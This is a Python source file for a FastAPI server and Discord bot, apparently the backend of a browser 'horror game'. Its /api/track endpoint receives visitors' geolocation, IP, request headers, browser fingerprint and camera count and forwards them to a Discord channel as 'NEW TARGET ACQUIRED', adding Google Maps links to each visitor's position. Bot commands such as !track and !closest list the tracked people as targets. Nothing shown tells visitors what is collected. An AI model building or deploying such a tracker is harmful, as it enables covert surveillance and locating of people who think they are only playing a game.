import os
import json
import random
import asyncio
from datetime import datetime
from fastapi import FastAPI, Request, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
import discord
from discord.ext import commands
from discord import Embed, Color
import uvicorn
from typing import Optional
import aiohttp
from dotenv import load_dotenv

load_dotenv()

# Discord Bot Setup
TOKEN = os.getenv('DISCORD_TOKEN')
CHANNEL_ID = int(os.getenv('DISCORD_CHANNEL_ID', '0'))

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# FastAPI Setup
app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://gamef-swart.vercel.app"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Data storage
tracked_users = {}
command_counter = 0

# ==================== DISCORD BOT ====================
@bot.event
async def on_ready():
    print(f'🎮 Horror Bot is online as {bot.user}')
    await bot.change_presence(activity=discord.Game(name="Watching 👁️"))

# Cool embed generator
def create_horror_embed(title: str, data: dict, user_info: Optional[dict] = None):
    colors = [Color.red(), Color.dark_red(), Color.purple(), Color.dark_purple()]
    
    embed = Embed(
        title=f"⚠️ {title} ⚠️",
        description=f"```{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```",
        color=random.choice(colors)
    )
    
    # Add scary fields
    if data.get('type') == 'location':
        coords = data.get('data', {}).get('coordinates', {})
        embed.add_field(
            name="📍 TARGET LOCATION",
            value=f"```\nLat: {coords.get('lat', 'unknown')}\nLon: {coords.get('lon', 'unknown')}\nAcc: {coords.get('accuracy', 'unknown')}m```",
            inline=False
        )
        
        # Add Google Maps link
        if coords.get('lat') and coords.get('lon'):
            maps_url = f"https://www.google.com/maps?q={coords['lat']},{coords['lon']}"
            embed.add_field(name="🗺️ MAP LINK", value=f"[View Target]({maps_url})", inline=False)
    
    elif data.get('type') == 'fingerprint':
        fp = data.get('data', {})
        browser = fp.get('browser', {})
        
        embed.add_field(name="💻 SYSTEM", value=f"```{fp.get('os', 'unknown')}```", inline=True)
        embed.add_field(name="🌐 IP", value=f"```{fp.get('ip', 'unknown')}```", inline=True)
        embed.add_field(name="🖥️ SCREEN", value=f"```{fp.get('screen', {}).get('width')}x{fp.get('screen', {}).get('height')}```", inline=True)
        embed.add_field(name="⏰ TIMEZONE", value=f"```{fp.get('timezone', {}).get('zone', 'unknown')}```", inline=True)
        embed.add_field(name="🌍 LANGUAGE", value=f"```{browser.get('language', 'unknown')}```", inline=True)
        embed.add_field(name="🎮 CORES", value=f"```{browser.get('hardwareConcurrency', 'unknown')}```", inline=True)
        
        if fp.get('cameras'):
            embed.add_field(name="📸 CAMERAS", value=f"```{len(fp['cameras'])} detected```", inline=True)
    
    elif data.get('type') == 'button':
        embed.add_field(name="🚫 BUTTON PRESSES", value=f"```{data.get('data', {}).get('presses', 0)}```", inline=True)
        
        # Scary messages based on count
        if data.get('data', {}).get('presses') == 9:
            embed.add_field(name="👁️ MESSAGE", value="```They're watching...```", inline=False)
    
    elif data.get('type') == 'scream':
        embed.add_field(name="📢 SCREAMS", value=f"```{data.get('data', {}).get('count', 0)}```", inline=True)
        
        if data.get('data', {}).get('count') >= 22:
            embed.add_field(name="🤫 WHISPER", value="```Helsinki at midnight```", inline=False)
    
    elif data.get('type') == 'name':
        embed.add_field(name="🎵 NAME ENTERED", value=f"```{data.get('data', {}).get('name', 'unknown')}```", inline=True)
    
    elif data.get('type') == 'chaos':
        embed.add_field(name="🌀 CHAOS UNLEASHED", value="```Protocol activated```", inline=True)
    
    # Add user info if available
    if user_info:
        embed.set_footer(text=f"User: {user_info.get('ip', 'unknown')} | {user_info.get('time', '')}")
    
    # Random spooky footer
    spooky_footers = [
        "They know where you live",
        "The cameras are watching",
        "Your screen is being recorded",
        "We can see you",
        "Don't turn around",
        "Behind you",
        "👁️"
    ]
    embed.set_footer(text=random.choice(spooky_footers))
    
    return embed

# ==================== DISCORD COMMANDS ====================
@bot.command(name='track')
async def track_user(ctx, user_id: str = None):
    """Track a specific user by ID"""
    if user_id and user_id in tracked_users:
        data = tracked_users[user_id]
        embed = create_horror_embed(f"TRACKING USER {user_id[:8]}", data, data.get('user_info'))
        await ctx.send(embed=embed)
    else:
        await ctx.send("⚠️ User not found or no ID provided")

@bot.command(name='stats')
async def show_stats(ctx):
    """Show tracking statistics"""
    global command_counter
    command_counter += 1
    
    embed = Embed(
        title="📊 SURVEILLANCE STATISTICS",
        color=Color.red()
    )
    
    embed.add_field(name="👥 Total Users", value=f"```{len(tracked_users)}```", inline=True)
    embed.add_field(name="📝 Commands Run", value=f"```{command_counter}```", inline=True)
    embed.add_field(name="🎮 Bot Status", value="```ACTIVE```", inline=True)
    
    # Location stats
    locations = sum(1 for u in tracked_users.values() 
                   if u.get('data', {}).get('coordinates'))
    embed.add_field(name="📍 Located Users", value=f"```{locations}```", inline=True)
    
    # Camera stats
    cameras = sum(len(u.get('data', {}).get('cameras', [])) 
                  for u in tracked_users.values())
    embed.add_field(name="📸 Cameras Found", value=f"```{cameras}```", inline=True)
    
    await ctx.send(embed=embed)

@bot.command(name='alert')
async def send_alert(ctx, *, message: str):
    """Send a creepy alert to all tracked users"""
    embed = Embed(
        title="⚠️ GLOBAL ALERT ⚠️",
        description=f"```{message}```",
        color=Color.dark_red()
    )
    embed.set_footer(text="This message appears on all tracked devices")
    
    # In a real implementation, this would send to frontend via WebSocket
    await ctx.send(embed=embed)

@bot.command(name='closest')
async def closest_target(ctx):
    """Find the closest tracked user"""
    # This would need actual location comparison
    await ctx.send("🔍 Scanning for nearest target... (implement with real data)")

@bot.command(name='help_horror')
async def horror_help(ctx):
    """Show all commands"""
    embed = Embed(
        title="👁️ HORROR BOT COMMANDS",
        description="All surveillance commands",
        color=Color.purple()
    )
    
    commands_list = [
        "`!track [id]` - Track specific user",
        "`!stats` - Show surveillance statistics",
        "`!alert [message]` - Send global alert",
        "`!closest` - Find nearest target",
        "`!broadcast` - Broadcast to all users",
        "`!scream` - Make all users scream",
        "`!glitch` - Glitch all connected screens"
    ]
    
    embed.add_field(name="📡 AVAILABLE COMMANDS", value="\n".join(commands_list), inline=False)
    embed.set_footer(text="Use with caution... they can see you too")
    
    await ctx.send(embed=embed)

@bot.command(name='broadcast')
async def broadcast(ctx, *, message: str):
    """Broadcast a message to all connected users"""
    embed = Embed(
        title="📢 SYSTEM BROADCAST",
        description=f"```{message}```",
        color=Color.red()
    )
    embed.set_footer(text="Message received by all active sessions")
    await ctx.send(embed=embed)

@bot.command(name='scream')
async def make_scream(ctx):
    """Make all users hear a scream"""
    embed = Embed(
        title="🔊 GLOBAL SCREAM",
        description="```AAAAAAAAAAAAAAAAAAAAH```",
        color=Color.dark_red()
    )
    embed.set_footer(text="They can hear you")
    await ctx.send(embed=embed)

@bot.command(name='glitch')
async def glitch_all(ctx):
    """Glitch all connected screens"""
    embed = Embed(
        title="🌀 GLOBAL GLITCH",
        description="```Initiating screen corruption...```",
        color=Color.purple()
    )
    embed.add_field(name="Status", value="```ACTIVE```", inline=True)
    embed.add_field(name="Users Affected", value=f"```{len(tracked_users)}```", inline=True)
    await ctx.send(embed=embed)

# ==================== FASTAPI ENDPOINTS ====================
@app.post("/api/track")
async def track_user_data(request: Request):
    """Receive tracking data from frontend"""
    try:
        data = await request.json()
        client_ip = request.client.host
        
        # Store user data
        user_id = f"{client_ip}_{datetime.now().timestamp()}"
        tracked_users[user_id] = {
            'data': data,
            'user_info': {
                'ip': client_ip,
                'time': datetime.now().isoformat(),
                'headers': dict(request.headers)
            }
        }
        
        # Send to Discord
        channel = bot.get_channel(CHANNEL_ID)
        if channel:
            embed = create_horror_embed(
                f"NEW TARGET ACQUIRED",
                data,
                {'ip': client_ip, 'time': datetime.now().strftime('%H:%M:%S')}
            )
            await channel.send(embed=embed)
            
            # If location data exists, send map
            if data.get('data', {}).get('coordinates'):
                coords = data['data']['coordinates']
                if coords.get('lat') and coords.get('lon'):
                    maps_url = f"https://www.google.com/maps?q={coords['lat']},{coords['lon']}"
                    await channel.send(f"📍 [Target Location]({maps_url})")
        
        return JSONResponse({"status": "tracked", "user_id": user_id})
    
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)

@app.get("/api/stats")
async def get_stats():
    """Get tracking statistics"""
    return {
        "total_users": len(tracked_users),
        "active_sessions": len(tracked_users),
        "last_update": datetime.now().isoformat()
    }

@app.get("/api/broadcast/{message}")
async def broadcast_message(message: str):
    """Broadcast a message to all users (would use WebSocket in production)"""
    return {"status": "broadcasted", "message": message, "users": len(tracked_users)}

# ==================== RUN BOTH ====================
async def run_bot():
    await bot.start(TOKEN)

def run_api():
    uvicorn.run(app, host="0.0.0.0", port=8000)

if __name__ == "__main__":
    import threading
    
    # Run bot in separate thread
    bot_thread = threading.Thread(target=lambda: asyncio.run(run_bot()))
    bot_thread.start()
    
    # Run API
    run_api()
